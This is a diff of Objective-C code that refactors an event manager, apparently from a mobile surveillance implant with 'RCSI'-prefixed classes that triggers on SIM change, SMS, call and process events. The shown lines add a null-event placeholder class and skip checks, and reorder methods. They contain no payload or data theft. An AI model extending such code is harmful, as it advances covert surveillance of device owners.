@@ -28,6 +28,7 @@
 #import "RCSIEventACPower.h"
 #import "RCSIEventScreensaver.h"
 #import "RCSIEventSimChange.h"
+#import "RCSINullEvent.h"
 
 //#define DEBUG_
 
@@ -120,17 +121,8 @@ NSLock *connectionLock;
 }
 
 #pragma mark -
-#pragma mark Events monitor routines
+#pragma mark Events list support
 #pragma mark -
-
-- (void)addEventNullInstance:(NSMutableDictionary*)theEvent
-{
-  NSObject *nullEvent = [[NSObject alloc] init];
-      
-  [theEvent setObject: nullEvent forKey: @"object"];
-  
-  [nullEvent release];
-}
 
 - (NSDate*)calculateDateFromMidnight:(NSTimeInterval)aInterval
 {
@@ -396,8 +388,28 @@ NSLock *connectionLock;
   [sim release];
 }
 
+- (void)addEventNullInstance:(NSMutableDictionary*)theEvent
+{
+  _i_NullEvent *nullEvent = [[_i_NullEvent alloc] init];
+  
+  [theEvent retain];
+  
+  [nullEvent setEventType:[[theEvent objectForKey: @"type"] intValue]];
+  [nullEvent setEnabled:[theEvent objectForKey: @"enabled"]];
+  [nullEvent setStart: [theEvent objectForKey: @"start"]];
+  [nullEvent setRepeat: [theEvent objectForKey: @"repeat"]];
+  [nullEvent setEnd: [theEvent objectForKey: @"end"]];
+  [nullEvent setIter: [theEvent objectForKey: @"iter"]];
+  [nullEvent setDelay: [theEvent objectForKey:@"delay"]];
+  
+  [theEvent setObject: nullEvent forKey: @"object"];
+  
+  [theEvent release];
+  [nullEvent release];
+}
+
 #pragma mark -
-#pragma mark Main runloop
+#pragma mark Messages dispatch and processing
 #pragma mark -
 
 typedef struct _coreMessage_t
@@ -562,24 +574,9 @@ typedef struct _coreMessage_t
   [pool release];
 }
 
-- (void)removeTimersFromCurrentRunLoop
-{
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  for (int i=0; i < [eventsList count]; i++) 
-    {
-      NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
-      
-      id eventInst = [theEvent objectForKey: @"object"];
-      
-      if (eventInst != nil && [eventInst respondsToSelector:@selector(removeTimers)])
-        {
-          [eventInst performSelector:@selector(removeTimers)];
-        }
-    }
-
-  [pool release];
-}
+#pragma mark -
+#pragma mark Events initialization
+#pragma mark -
 
 - (void)startRemoteEvent:(u_int)eventID
 {
@@ -620,7 +617,13 @@ typedef struct _coreMessage_t
       NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
     
       _i_Event *eventInst = [theEvent objectForKey: @"object"];
-    
+      
+      /*
+       * skip event null (used only for keep the correct position in event list)
+       */
+      if ([eventInst eventType] == EVENT_NULL)
+        continue;
+      
       if (eventInst != nil)
         {
           switch ([eventInst eventType]) 
@@ -644,6 +647,12 @@ typedef struct _coreMessage_t
       NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
       
       _i_Event *eventInst = [theEvent objectForKey: @"object"];
+
+      /*
+       * skip event null (used only for keep the correct position in event list)
+       */
+      if ([eventInst eventType] == EVENT_NULL)
+        continue;
       
       if (eventInst != nil)
         {
@@ -659,6 +668,31 @@ typedef struct _coreMessage_t
   [pool release];
 }
 
+- (void)removeTimersFromCurrentRunLoop
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  for (int i=0; i < [eventsList count]; i++)
+  {
+    NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
+    
+    id eventInst = [theEvent objectForKey: @"object"];
+    
+    /*
+     * skip event null (used only for keep the correct position in event list)
+     */
+    if ([eventInst eventType] == EVENT_NULL)
+      continue;
+    
+    if (eventInst != nil && [eventInst respondsToSelector:@selector(removeTimers)])
+    {
+      [eventInst performSelector:@selector(removeTimers)];
+    }
+  }
+  
+  [pool release];
+}
+
 - (void)addTimersToCurrentRunLoop
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -669,6 +703,12 @@ typedef struct _coreMessage_t
     
     id eventInst = [theEvent objectForKey: @"object"];
     
+    /*
+     * skip event null (used only for keep the correct position in event list)
+     */
+    if ([eventInst eventType] == EVENT_NULL)
+      continue;
+    
     if (eventInst != nil && [eventInst respondsToSelector:@selector(setStartTimer)])
       {
         [eventInst performSelector:@selector(setStartTimer)];
@@ -678,8 +718,94 @@ typedef struct _coreMessage_t
   [pool release];
 }
 
+- (BOOL)initEvents
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  id theEvent;
+  int eventPos = 0;
+  
+  NSEnumerator *enumerator = [eventsList objectEnumerator];
+  
+  while ((theEvent = [enumerator nextObject]))
+  {
+    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+    
+    switch ([[theEvent objectForKey: @"type"] intValue])
+    {
+      case EVENT_TIMER:
+      {
+        [self addEventTimerInstance: theEvent];
+        break;
+      }
+      case EVENT_PROCESS:
+      {
+        [self addEventProcessInstance: theEvent];
+        break;
+      }
+      case EVENT_CONNECTION:
+      {
+        [self addEventConnectivityInstance:theEvent];
+        break;
+      }
+      case EVENT_BATTERY:
+      {
+        [self addEventBatteryInstance:theEvent];
+        break;
+      }
+      case EVENT_AC:
+      {
+        [self addEventACInstance:theEvent];
+        break;
+      }
+      case EVENT_STANDBY:
+      {
+        [self addEventScreensaverInstance:theEvent];
+        break;
+      }
+      case EVENT_SIM_CHANGE:
+      {
+        [self addEventSimChangeInstance:theEvent];
+        break;
+      }
+      case EVENT_SMS:
+      {
+        [self addEventNullInstance:theEvent];
+        break;
+      }
+      case EVENT_CALL:
+      {
+        [self addEventNullInstance:theEvent];
+        break;
+      }
+      case EVENT_QUOTA:
+      {
+        [self addEventNullInstance:theEvent];
+        break;
+      }
+      default:
+      {
+        [self addEventNullInstance:theEvent];
+        break;
+      }
+    }
+    
+    eventPos++;
+    
+    [innerPool release];
+  }
+  
+  [outerPool release];
+  
+  return TRUE;
+}
+
+#pragma mark -
+#pragma mark Main runloop
+#pragma mark -
+
 - (void)eventManagerRunLoop
-{    
+{
   eventManagerStatus = EVENT_MANAGER_RUNNING;
   
   NSRunLoop *eventManagerRunLoop = [NSRunLoop currentRunLoop];
@@ -717,87 +843,9 @@ typedef struct _coreMessage_t
   [self stop];
 }
 
-- (BOOL)initEvents
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  id theEvent;
-  int eventPos = 0;
-  
-  NSEnumerator *enumerator = [eventsList objectEnumerator];
-  
-  while ((theEvent = [enumerator nextObject]))
-    {
-      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      
-      switch ([[theEvent objectForKey: @"type"] intValue])
-        {
-          case EVENT_TIMER:
-          {
-            [self addEventTimerInstance: theEvent];
-          break;
-          }
-          case EVENT_PROCESS:
-          {
-            [self addEventProcessInstance: theEvent];
-            break;
-          }
-          case EVENT_CONNECTION:
-          {
-            [self addEventConnectivityInstance:theEvent];
-            break; 
-          }
-          case EVENT_BATTERY:
-          {
-            [self addEventBatteryInstance:theEvent];
-            break;
-          }
-          case EVENT_AC:
-          {
-            [self addEventACInstance:theEvent];
-            break;
-          }
-          case EVENT_STANDBY:
-          {
-            [self addEventScreensaverInstance:theEvent];
-            break;
-          }
-          case EVENT_SIM_CHANGE:
-          {
-            [self addEventSimChangeInstance:theEvent];
-            break;
-          }
-          case EVENT_SMS:
-          {
-            [self addEventNullInstance:theEvent];
-            break;
-          }
-          case EVENT_CALL:
-          { 
-            [self addEventNullInstance:theEvent];
-            break;
-          }
-          case EVENT_QUOTA:
-          {
-            [self addEventNullInstance:theEvent];
-            break;
-          }
-          default:
-          {
-            [self addEventNullInstance:theEvent];
-            break;
-          }
-        }
-      
-      eventPos++;
-      
-      [innerPool release];
-    }
-  
-  [outerPool release];
-  
-  return TRUE;
-}
+#pragma mark -
+#pragma mark Agents proto implementation
+#pragma mark -
 
 - (BOOL)start
 {
